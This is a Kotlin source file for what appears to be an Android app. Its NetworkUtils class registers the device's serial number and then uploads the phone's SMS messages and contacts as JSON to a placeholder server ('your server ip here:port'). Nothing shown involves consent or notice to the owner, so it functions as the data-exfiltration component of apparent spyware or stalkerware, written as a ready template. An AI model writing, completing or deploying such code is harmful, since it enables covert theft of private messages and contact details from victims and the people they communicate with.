package com.example.sender

import okhttp3.*
import com.google.gson.Gson
import java.io.IOException
import java.net.Inet4Address
import java.net.InetAddress
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody

class NetworkUtils {

    private val client = OkHttpClient.Builder()
        .dns(object : Dns {
            override fun lookup(hostname: String): List<InetAddress> {
                return InetAddress.getAllByName(hostname).filterIsInstance<Inet4Address>()
            }
        })
        .build()

    fun registerSerialNumber(serialNumber: String, callback: (Boolean) -> Unit) {
        val url = "http://your server ip here:port/api/register"
        val json = "{\"deviceSerial\":\"$serialNumber\"}"
        val requestBody = json.toRequestBody("application/json".toMediaTypeOrNull())

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
                callback(false)
            }

            override fun onResponse(call: Call, response: Response) {
                callback(response.isSuccessful)
            }
        })
    }

    fun sendSmsAndContacts(serialNumber: String, smsData: String, contactsData: String) {
        val url = "http://your server ip here:port/api/endpoint"
        val json = createJson(serialNumber, smsData, contactsData)
        val requestBody = json.toRequestBody("application/json".toMediaTypeOrNull())

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .addHeader("Content-Type", "application/json")
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    println("Response: ${response.body?.string()}")
                } else {
                    println("Error: ${response.code}")
                }
            }
        })
    }

    private fun createJson(serialNumber: String, smsData: String, contactsData: String): String {
        val dataMap = mapOf(
            "deviceSerial" to serialNumber,
            "sms" to smsData,
            "contacts" to contactsData
        )
        return Gson().toJson(dataMap)
    }
}
